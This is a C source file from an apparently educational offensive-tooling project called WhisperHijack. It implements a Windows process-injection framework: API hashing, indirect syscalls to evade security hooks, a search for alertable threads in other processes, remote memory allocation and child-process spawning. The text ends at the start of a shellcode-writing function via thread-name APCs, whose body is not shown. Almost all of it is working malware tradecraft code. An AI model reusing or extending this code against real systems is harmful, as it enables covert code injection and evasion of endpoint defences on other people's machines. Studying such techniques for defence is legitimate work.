// Copyright 2026 MalDev Academy
// WhisperHijack - Licensed under the Apache License, Version 2.0 (the "License")
// https://github.com/Maldev-Academy/WhisperHijack


#include "Common.h"
#include "IndirectSyscalling.h"
#include "ResolveAPIs.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// The following constants are used only in WriteMemoryViaThreadNameApc
// Read the comments in WriteMemoryViaThreadNameApc for more info

#define MAX_THREAD_NAME_LEN         0xFFFE                                          // Kernel cap for ThreadNameInformation: 64KB - sizeof(WCHAR)
#define TNC_WAIT_TIMEOUT_MS         5000                                            // 5-second ceiling per chunk 

/* OPTION 1 */
//#define PEB_SCRATCH_SLOT_OFFSET   offsetof(PEB, SpareUlongs)                      // Offset of the PEB scratch slot used as the APC drop-point for the heap pointer (explained below)
//C_ASSERT(sizeof(((PEB*)0)->SpareUlongs) >= sizeof(PVOID));                        // Must be at least pointer-sized


/* OPTION 2 */
//#define PEB_SCRATCH_SLOT_OFFSET    offsetof(PEB, PostProcessInitRoutine)           
//C_ASSERT(sizeof(((PEB*)0)->PostProcessInitRoutine) >= sizeof(PVOID));


/* OPTION 3 */
#define TEB_SCRATCH_SLOT_IDX        63                                              // TlsSlots[63]; last of the 64, but almost always unused. 
#define TEB_SCRATCH_SLOT_OFFSET     (offsetof(TEB, TlsSlots) + (TEB_SCRATCH_SLOT_IDX * sizeof(PVOID)))
C_ASSERT(TEB_SCRATCH_SLOT_IDX < RTL_NUMBER_OF(((PTEB)0)->TlsSlots));                // Slot index must be inside the fixed TlsSlots array


#if !defined(PEB_SCRATCH_SLOT_OFFSET) && !defined(TEB_SCRATCH_SLOT_OFFSET)
#error "No scratch slot defined; enable one of OPTION 1, 2, or 3"
#endif
#if defined(PEB_SCRATCH_SLOT_OFFSET) && defined(TEB_SCRATCH_SLOT_OFFSET)
#error "Both PEB and TEB scratch slots defined; enable only one"
#endif

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _API_GLOBAL
{
    NT_SYSCALL    ntQuerySystemInformation;
    NT_SYSCALL    ntOpenProcess;
    NT_SYSCALL    ntOpenThread;
    NT_SYSCALL    ntQueryInformationProcess;
    NT_SYSCALL    ntQueryVirtualMemory;
    NT_SYSCALL    ntAllocateVirtualMemory;
    NT_SYSCALL    ntProtectVirtualMemory;
    NT_SYSCALL    ntQueueApcThread;
    NT_SYSCALL    ntCreateUserProcess;
    NT_SYSCALL    ntGetContextThread;
    NT_SYSCALL    ntAlertThread;              
    NT_SYSCALL    ntSetInformationThread;     
    NT_SYSCALL    ntReadVirtualMemory;       
    NT_SYSCALL    ntCreateEvent;                  
    NT_SYSCALL    ntDuplicateObject;              
    NT_SYSCALL    ntWaitForSingleObject;          
    NT_SYSCALL    ntClose;
#ifdef TEB_SCRATCH_SLOT_OFFSET
    NT_SYSCALL    ntQueryInformationThread;       // Only needed in TEB-scratch mode
#endif
    PVOID                               pRtlFillMemory;
    PVOID                               pRtlMoveMemory;
    PVOID                               pGetThreadDescription;
    fnRtlCreateProcessParametersEx      pRtlCreateParamsEx;
    fnRtlDestroyProcessParameters       pRtlDestroyParams;
    fnRtlInitUnicodeString              pRtlInitUnicodeString;
    PVOID                               pNtSetEvent;
    PVOID                               pNtClose;

} API_GLOBAL, * PAPI_GLOBAL;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

API_GLOBAL     g_APIs   = { 0 };

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeWinNtAPIsGlobal()
{
    HMODULE     hKernel32Module     = NULL;
    HMODULE     hNtdllModule        = NULL;

    if (!(hKernel32Module = GetModuleHandleH(CRC32B_KERNEL32DLL)) || !(hNtdllModule = GetModuleHandleH(CRC32B_NTDLLDLL)))
    {
        DBG("[!] GetModuleHandleH Failed To Resolve KERNEL32/NTDLL");
        return FALSE;
    }

    if (!(g_APIs.pGetThreadDescription = (PVOID)GetProcAddressH(hKernel32Module, CRC32B_GETTHREADDESCRIPTION)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve GetThreadDescription");
        return FALSE;
    }

    if (!(g_APIs.pRtlFillMemory = (PVOID)GetProcAddressH(hNtdllModule, CRC32B_RTLFILLMEMORY)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve RtlFillMemory");
        return FALSE;
    }

    if (!(g_APIs.pRtlMoveMemory = (PVOID)GetProcAddressH(hNtdllModule, CRC32B_RTLMOVEMEMORY)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve RtlMoveMemory");
        return FALSE;
    }

    if (!(g_APIs.pRtlCreateParamsEx = (fnRtlCreateProcessParametersEx)GetProcAddressH(hNtdllModule, CRC32B_RTLCREATEPROCESSPARAMETERSEX)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve RtlCreateProcessParametersEx");
        return FALSE;
    }

    if (!(g_APIs.pRtlDestroyParams = (fnRtlDestroyProcessParameters)GetProcAddressH(hNtdllModule, CRC32B_RTLDESTROYPROCESSPARAMETERS)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve RtlDestroyProcessParameters");
        return FALSE;
    }

    if (!(g_APIs.pRtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddressH(hNtdllModule, CRC32B_RTLINITUNICODESTRING)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve RtlInitUnicodeString");
        return FALSE;
    }

    if (!(g_APIs.pNtSetEvent = (PVOID)GetProcAddressH(hNtdllModule, CRC32B_NTSETEVENT)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve NtSetEvent");
        return FALSE;
    }

    if (!(g_APIs.pNtClose = (PVOID)GetProcAddressH(hNtdllModule, CRC32B_NTCLOSE)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve NtClose");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTOPENPROCESS, &g_APIs.ntOpenProcess))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtOpenProcess");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTQUERYSYSTEMINFORMATION, &g_APIs.ntQuerySystemInformation))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtQuerySystemInformation");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTOPENTHREAD, &g_APIs.ntOpenThread))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtOpenThread");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTQUERYINFORMATIONPROCESS, &g_APIs.ntQueryInformationProcess))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtQueryInformationProcess");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTCLOSE, &g_APIs.ntClose))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtClose");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTQUERYVIRTUALMEMORY, &g_APIs.ntQueryVirtualMemory))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtQueryVirtualMemory");
        return FALSE;
    }
    
    if (!InitializeIndirectSyscall(CRC32B_NTALLOCATEVIRTUALMEMORY, &g_APIs.ntAllocateVirtualMemory))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtAllocateVirtualMemory");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTQUEUEAPCTHREAD, &g_APIs.ntQueueApcThread))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtQueueApcThread");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTPROTECTVIRTUALMEMORY, &g_APIs.ntProtectVirtualMemory))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtProtectVirtualMemory");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTCREATEUSERPROCESS, &g_APIs.ntCreateUserProcess))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtCreateUserProcess");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTGETCONTEXTTHREAD, &g_APIs.ntGetContextThread))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtGetContextThread");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTALERTTHREAD, &g_APIs.ntAlertThread))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtAlertThread");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTSETINFORMATIONTHREAD, &g_APIs.ntSetInformationThread))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtSetInformationThread");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTREADVIRTUALMEMORY, &g_APIs.ntReadVirtualMemory))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtReadVirtualMemory");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTCREATEEVENT, &g_APIs.ntCreateEvent))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtCreateEvent");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTDUPLICATEOBJECT, &g_APIs.ntDuplicateObject))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtDuplicateObject");
        return FALSE;
    }

    if (!InitializeIndirectSyscall(CRC32B_NTWAITFORSINGLEOBJECT, &g_APIs.ntWaitForSingleObject))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtWaitForSingleObject");
        return FALSE;
    }

#ifdef TEB_SCRATCH_SLOT_OFFSET
    if (!InitializeIndirectSyscall(CRC32B_NTQUERYINFORMATIONTHREAD, &g_APIs.ntQueryInformationThread))
    {
        DBG("[!] InitializeIndirectSyscall Failed For NtQueryInformationThread");
        return FALSE;
    }
#endif
    
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL FindAlertableThread(OUT PDWORD pdwProcessId, OUT PDWORD pdwThreadId, OUT OPTIONAL PHANDLE phProcess, OUT OPTIONAL PHANDLE phThread, OUT OPTIONAL LPWSTR wszProcessName)
{
	NTSTATUS                        ntStatus                    = STATUS_SUCCESS;
    ULONG                           uArrayLength                = 0x00;
    PSYSTEM_PROCESS_INFORMATION     pSystemProcInfo             = NULL;
    PBYTE                           pTmpPntrVar                 = NULL;
   
	if (!pdwProcessId || !pdwThreadId)
		return FALSE;

	// Dry-Run NtQuerySystemInformation(SystemProcessInformation) 
	INITIALIZE_SYSCALL(g_APIs.ntQuerySystemInformation);
	ntStatus = (NTSTATUS)INVOKE_SYSCALL(SystemProcessInformation, NULL, 0, &uArrayLength);
    if (!NT_SUCCESS(ntStatus) && ntStatus != STATUS_INFO_LENGTH_MISMATCH)
    {
        DBG("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }
	
	// Initial Allocation
	if (!(pTmpPntrVar = pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uArrayLength)))
	{
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
		goto _END_OF_FUNC;
	}

	// Keep growing the buffer until it fits 
	while (TRUE)
    {
        // Run NtQuerySystemInformation(SystemProcessInformation) 
		INITIALIZE_SYSCALL(g_APIs.ntQuerySystemInformation);
		ntStatus = (NTSTATUS)INVOKE_SYSCALL(SystemProcessInformation, pSystemProcInfo, uArrayLength, &uArrayLength);
        if (ntStatus != STATUS_INFO_LENGTH_MISMATCH)
            break;

        // Grow the heap until NtQuerySystemInformation succeeds
#define GROWTH_FACTOR 2
        uArrayLength *= GROWTH_FACTOR;
#undef  GROWTH_FACTOR

        if (!(pTmpPntrVar = pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pTmpPntrVar, uArrayLength)))
        {
            DBG("[!] HeapReAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }
    }

    if (!NT_SUCCESS(ntStatus))
    {
		DBG("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

	// Walk the process list 
	while (pSystemProcInfo->NextEntryOffset) 
	{
		// Skip System Idle Process (PID 0) and System Process (PID 4)
		if ((DWORD)pSystemProcInfo->UniqueProcessId <= 0x04)
			goto _NEXT_PROCESS;

		for (ULONG i = 0; i < pSystemProcInfo->NumberOfThreads; i++) 
		{
            PSYSTEM_THREAD_INFORMATION  pThreadInfo     = &pSystemProcInfo->ThreadInfos[i];
            HANDLE                      hTmpProcess     = NULL;
            HANDLE                      hTmpThread      = NULL;
            

            // Skip threads that are not Alertable
            if (pThreadInfo->ThreadState != Waiting || pThreadInfo->WaitReason != WrQueue) // Tested WrUserRequest && UserRequest with no luck
                continue;
            
            // DBG("[v] Found Candidate Thread: %lu Of Process %lu", pThreadInfo->ClientId.UniqueThread, pSystemProcInfo->UniqueProcessId);

			if (phProcess)
            {
                // Run NtOpenProcess
                OBJECT_ATTRIBUTES   ObjAttr     = { 0 };
                CLIENT_ID           ClientId    = { 0 };
                ULONG_PTR           uPeb32Addr  = 0x00;
                ULONG               uRetLen     = 0x00;

                InitializeObjectAttributes(&ObjAttr, NULL, OBJ_INHERIT, NULL, NULL);
                ClientId.UniqueProcess  = pSystemProcInfo->UniqueProcessId;
				ClientId.UniqueThread   = NULL;

                INITIALIZE_SYSCALL(g_APIs.ntOpenProcess);
                ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hTmpProcess,
                    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,  // ! PROCESS_VM_WRITE
                    &ObjAttr, &ClientId);
                if (!NT_SUCCESS(ntStatus) || !hTmpProcess)
                {
                    // Excluding Access Denied  
                    if (ntStatus != STATUS_ACCESS_DENIED)
                    {
    					DBG("[!] NtOpenProcess Failed For %ws (%lu) With Error: 0x%0.8X",
                            pSystemProcInfo->ImageName.Buffer ? pSystemProcInfo->ImageName.Buffer : L"<Unknown>",
                            (DWORD)(ULONG_PTR)pSystemProcInfo->UniqueProcessId, ntStatus);
                    }
                    goto _NEXT_PROCESS;
                }

                // Run NtQueryInformationProcess(ProcessWow64Information)
                // Check if process is a Wow64 process (to skip)
                INITIALIZE_SYSCALL(g_APIs.ntQueryInformationProcess);
                ntStatus = (NTSTATUS)INVOKE_SYSCALL(hTmpProcess, ProcessWow64Information, &uPeb32Addr, sizeof(ULONG_PTR), &uRetLen);
                if (!NT_SUCCESS(ntStatus) || uPeb32Addr != 0x00)
                {
                    INITIALIZE_SYSCALL(g_APIs.ntClose);
                    (VOID)INVOKE_SYSCALL(hTmpProcess);
                    goto _NEXT_PROCESS;
                }

                *phProcess = hTmpProcess;
            }

			if (phThread)
            {
                // Run NtOpenThread
                OBJECT_ATTRIBUTES   ObjAttr     = { 0 };
                CLIENT_ID           ClientId    = { 0 };

                InitializeObjectAttributes(&ObjAttr, NULL, OBJ_INHERIT, NULL, NULL);
                ClientId.UniqueProcess  = NULL;
                ClientId.UniqueThread   = pThreadInfo->ClientId.UniqueThread;

                INITIALIZE_SYSCALL(g_APIs.ntOpenThread);
                ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hTmpThread, THREAD_ALL_ACCESS, &ObjAttr, &ClientId);
                if (!NT_SUCCESS(ntStatus) || !hTmpThread)
                {
                    DBG("[!] NtOpenThread Failed For %ws (%lu) With Error: 0x%0.8X",
                        pSystemProcInfo->ImageName.Buffer ? pSystemProcInfo->ImageName.Buffer : L"<Unknown>",
                        (DWORD)(ULONG_PTR)pSystemProcInfo->UniqueProcessId, ntStatus);

                    // NtOpenThread Failed But We Have An Open Process Handle
                    if (phProcess && *phProcess)
                    {
                        INITIALIZE_SYSCALL(g_APIs.ntClose);
                        (VOID)INVOKE_SYSCALL(*phProcess);
                        *phProcess = NULL;
                    }
                    goto _NEXT_PROCESS;
                }

                *phThread = hTmpThread;
            }

            // Both NtOpenProcess & NtOpenThread succeeded
            // We continue with populating the output parameters
            *pdwProcessId   = (DWORD)(ULONG_PTR)pSystemProcInfo->UniqueProcessId;
            *pdwThreadId    = (DWORD)(ULONG_PTR)pThreadInfo->ClientId.UniqueThread;

            // If specified
            if (wszProcessName && pSystemProcInfo->ImageName.Buffer)
            {
                lstrcpyW(wszProcessName, pSystemProcInfo->ImageName.Buffer);
            }

            goto _END_OF_FUNC;
        }

_NEXT_PROCESS:
		pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
	}

_END_OF_FUNC:
	if (pTmpPntrVar)
		HeapFree(GetProcessHeap(), 0x00, pTmpPntrVar);
	return (*pdwProcessId && *pdwThreadId) ? TRUE : FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static PVOID FindSuitableAddress(IN HANDLE hProcess, IN ULONG uLength, IN ULONG uGranularity, OUT PULONG puGranularityCount OPTIONAL)
{
    MEMORY_BASIC_INFORMATION    MbiRegion           = { 0 };
    ULONG_PTR                   uAddress            = 0x00;
    ULONG                       uGranularityCount   = 0x00;
    ULONG                       uFreeCount          = 0x00;
    NTSTATUS                    ntStatus            = STATUS_SUCCESS;
    SIZE_T                      sReturnLength       = 0x00;
    ULONG_PTR                   puCandidates[]      = {
        0x00000000DDDD0000,
        0x0000000010000000,
        0x0000000021000000,
        0x0000000032000000,
        0x0000000043000000,
        0x0000000050000000,
        0x0000000041000000,
        0x0000000042000000,
        0x0000000040000000,
        0x0000000022000000,
        0x0000000054000000,
        0x0000000065000000,
        0x0000000076000000,
        0x0000000060000000,
        0x0000000070000000,
        0x0000000000020000,
        0x0000000000100000,
        0x0000000001000000,
        0x00000000CCCC0000
    };

    // Calculate how many granularity-sized chunks are needed to cover uLength
    uGranularityCount = (uLength / uGranularity) + 1;

    if (puGranularityCount) *puGranularityCount = uGranularityCount;

    DBG("[i] Searching For %lu Bytes (%lu Chunks Of 0x%lX) In Handle 0x%p", uLength, uGranularityCount, uGranularity, hProcess);

    for (ULONG ulIdx = 0; ulIdx < ARRAYSIZE(puCandidates); ulIdx++)
    {
        uFreeCount = 0;

        // Walk each granularity-sized chunk forward from the candidate base
        for (ULONG uChunk = 0; uChunk < uGranularityCount; uChunk++)
        {
            // Derive the address for this chunk cleanly from the base each iteration
            uAddress = puCandidates[ulIdx] + ((ULONG_PTR)uChunk * uGranularity);

            RtlZeroMemory(&MbiRegion, sizeof(MbiRegion));

            // Run NtQueryVirtualMemory(MemoryBasicInformation)
            INITIALIZE_SYSCALL(g_APIs.ntQueryVirtualMemory);
            ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, (PVOID)uAddress, MemoryBasicInformation, &MbiRegion, sizeof(MbiRegion), &sReturnLength);

            // Any failure (invalid address past user-mode, unmapped, etc.) disqualifies the candidate
            if (!NT_SUCCESS(ntStatus))
                break;

            // Candidate is unsuitable if any chunk in range is not free
            if (MbiRegion.State != MEM_FREE)
                break;

            uFreeCount++;
        }

        // All chunks were free.
        if (uFreeCount == uGranularityCount)
        {
            DBG("[+] Found Suitable Address: 0x%p (%lu Chunks Free)", (PVOID)puCandidates[ulIdx], uFreeCount);
            return (PVOID)puCandidates[ulIdx];
        }
    }

    DBG("[-] No Suitable Address Found Across %lu Candidates", (ULONG)ARRAYSIZE(puCandidates));
    return NULL;
}

static PVOID AllocateVirtualMemory(IN HANDLE hProcess, IN ULONG uLength, IN ULONG uProtection)
{
    PVOID           pBaseAddress        = NULL;
    PVOID           pTmpAddress         = NULL;
    SIZE_T          sTmpSize            = 0x00;
    ULONG_PTR       uGranularityAlloc   = 0x00,
                    uPageAddress        = 0x00;
    ULONG           uGranularitySize    = 0x00,
                    uGranularityCount   = 0x00,
                    uPageSize           = 0x00;
    SYSTEM_INFO     SystemInfo          = { 0 };
    NTSTATUS        ntStatus            = STATUS_SUCCESS;

    if (!hProcess || !uLength || !uProtection)
        return NULL;

    GetSystemInfo(&SystemInfo);

    uGranularitySize    = SystemInfo.dwAllocationGranularity;
    uPageSize           = SystemInfo.dwPageSize;

    // Find a suitable base address, receiving the granularity count to avoid recomputing it
    if (!(pBaseAddress = FindSuitableAddress(hProcess, uLength, uGranularitySize, &uGranularityCount)))
        return NULL;

    uGranularityAlloc = (ULONG_PTR)pBaseAddress;

    // Reserve each granularity-sized region, then commit its individual pages
    for (ULONG ulIdx = 0; ulIdx < uGranularityCount; ulIdx++)
    {
        // Reserve the granularity-sized region as PAGE_NOACCESS
        pTmpAddress = (PVOID)uGranularityAlloc;
        sTmpSize    = (SIZE_T)uGranularitySize;

        // Run NtAllocateVirtualMemory
        INITIALIZE_SYSCALL(g_APIs.ntAllocateVirtualMemory);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, &pTmpAddress, 0, &sTmpSize, MEM_RESERVE, PAGE_NOACCESS);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
            return NULL;
        }

        DBG("[+] Reserved Granularity Region %lu/%lu: 0x%p", ulIdx + 1, uGranularityCount, (PVOID)uGranularityAlloc);

        // Commit each page within the reserved region with the requested protection
        for (ULONG uPage = 0; uPage < (uGranularitySize / uPageSize); uPage++)
        {
            uPageAddress = uGranularityAlloc + ((ULONG_PTR)uPage * uPageSize);
            pTmpAddress  = (PVOID)uPageAddress;
            sTmpSize     = (SIZE_T)uPageSize;

            // Run NtAllocateVirtualMemory
            INITIALIZE_SYSCALL(g_APIs.ntAllocateVirtualMemory);
            ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, &pTmpAddress, 0, &sTmpSize, MEM_COMMIT, uProtection);
            if (!NT_SUCCESS(ntStatus))
            {
                DBG("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
                return NULL;
            }
        }

        uGranularityAlloc += uGranularitySize;
    }

    DBG("[+] Allocated %lu Bytes @ 0x%p (%lu Regions Committed)", uLength, pBaseAddress, uGranularityCount);
    return pBaseAddress;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL SpawnChildProcess(IN LPCWSTR pwszImagePath, IN LPCWSTR pwszCommandLine, IN BOOL bHardenChild, IN OPTIONAL PHANDLE pInheritHandles, IN ULONG uInheritHandleCount)
{
    NTSTATUS                            ntStatus                = STATUS_SUCCESS;
    PRTL_USER_PROCESS_PARAMETERS        pProcParams             = NULL;
    PPS_ATTRIBUTE_LIST                  pAttrList               = NULL;
    SIZE_T                              sAttrListSize           = 0x00;
    ULONG                               uAttrCount              = 0x00,
                                        uAttrIndex              = 0x00;
    UINT64                              u64MitigationPolicy     = MITIGATION_POLICY_HARDENED;
    UNICODE_STRING                      usImagePath             = { 0 };
    UNICODE_STRING                      usCommandLine           = { 0 };
    UNICODE_STRING                      usCurrentDir            = { 0 };
    PS_CREATE_INFO                      psCreateInfo            = { 0 };
    HANDLE                              hChildProcess           = NULL;
    HANDLE                              hChildThread            = NULL;
    BOOL                                bResult                 = FALSE;

    if (!pwszImagePath || !pwszCommandLine)
        return FALSE;

    // Build UNICODE_STRINGs for the three required path strings 
    g_APIs.pRtlInitUnicodeString(&usImagePath,   pwszImagePath);
    g_APIs.pRtlInitUnicodeString(&usCommandLine, pwszCommandLine);
    g_APIs.pRtlInitUnicodeString(&usCurrentDir,  L"C:\\Windows\\System32\\");

    // Build RTL_USER_PROCESS_PARAMETERS  
    ntStatus = g_APIs.pRtlCreateParamsEx(
        &pProcParams,
        &usImagePath,
        NULL,                                   // DllPath           (Default)
        &usCurrentDir,                          // CurrentDirectory   
        &usCommandLine,                         // CommandLine       
        NULL,                                   // Environment       (Inherit)
        NULL,                                   // WindowTitle
        NULL,                                   // DesktopInfo
        NULL,                                   // ShellInfo
        NULL,                                   // RuntimeData
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    // Build PS_ATTRIBUTE_LIST(s) 
    //
    // Required: PsAttributeImageName
    // Optional: PsAttributeMitigationOptions  (if bHardenChild)
    // Optional: PsAttributeHandleList         (if uInheritHandleCount > 0)
    //
    uAttrCount      = 1 + (bHardenChild ? 1 : 0) + (uInheritHandleCount > 0 ? 1 : 0);
    sAttrListSize   = sizeof(SIZE_T) + (uAttrCount * sizeof(PS_ATTRIBUTE));

    if (!(pAttrList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sAttrListSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    pAttrList->TotalLength                      = sAttrListSize;

    // Attribute: Image name (always present)
    pAttrList->Attributes[uAttrIndex].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    pAttrList->Attributes[uAttrIndex].Size      = usImagePath.Length;
    pAttrList->Attributes[uAttrIndex].ValuePtr  = usImagePath.Buffer;
    uAttrIndex++;

    // Attribute: Mitigation policy (only when hardening was requested)
    if (bHardenChild)
    {
        pAttrList->Attributes[uAttrIndex].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
        pAttrList->Attributes[uAttrIndex].Size      = sizeof(u64MitigationPolicy);
        pAttrList->Attributes[uAttrIndex].ValuePtr  = &u64MitigationPolicy;
        uAttrIndex++;
    }

    // Attribute: Inherit handle list (only when handles were supplied)
    if (uInheritHandleCount > 0)
    {
        pAttrList->Attributes[uAttrIndex].Attribute = PS_ATTRIBUTE_HANDLE_LIST;
        pAttrList->Attributes[uAttrIndex].Size      = uInheritHandleCount * sizeof(HANDLE);
        pAttrList->Attributes[uAttrIndex].ValuePtr  = pInheritHandles;
        uAttrIndex++;
    }

    // Build PS_CREATE_INFO 
    psCreateInfo.Size   = sizeof(PS_CREATE_INFO);
    psCreateInfo.State  = PsCreateInitialState;

    // Run NtCreateUserProcess 
    INITIALIZE_SYSCALL(g_APIs.ntCreateUserProcess);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(
        &hChildProcess,                                                         // ProcessHandle
        &hChildThread,                                                          // ThreadHandle
        PROCESS_ALL_ACCESS,                                                     // ProcessDesiredAccess
        THREAD_ALL_ACCESS,                                                      // ThreadDesiredAccess
        NULL,                                                                   // ProcessObjectAttributes
        NULL,                                                                   // ThreadObjectAttributes
        (uInheritHandleCount > 0) ? PROCESS_CREATE_FLAGS_INHERIT_HANDLES : 0,   // ProcessFlags
        0,                                                                      // ThreadFlags
        pProcParams,                                                            // ProcessParameters
        &psCreateInfo,                                                          // CreateInfo
        pAttrList                                                               // AttributeList
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtCreateUserProcess Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    DBG("[+] %s Child Spawned (hProcess=0x%p, hThread=0x%p)", bHardenChild ? "Hardened" : "Normal", hChildProcess, hChildThread);
    
    bResult = TRUE;

_END_OF_FUNC:
    if (pProcParams)        g_APIs.pRtlDestroyParams(pProcParams);
    if (pAttrList)          HeapFree(GetProcessHeap(), 0x00, pAttrList);

    if (hChildProcess)
    {
        INITIALIZE_SYSCALL(g_APIs.ntClose);
        (VOID)INVOKE_SYSCALL(hChildProcess);
    }
    if (hChildThread)
    {
        INITIALIZE_SYSCALL(g_APIs.ntClose);
        (VOID)INVOKE_SYSCALL(hChildThread);
    }

    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// WriteMemoryViaThreadNameApc is based on "USING THREAD NAME FOR OFFENSE"
// (https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense)

static BOOL WriteMemoryViaThreadNameApc(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pAllocatedAddress, IN PBYTE pShellcodeBuffer, IN ULONG uShellcodeSize, IN BOOL bExecuteShellcode)
{
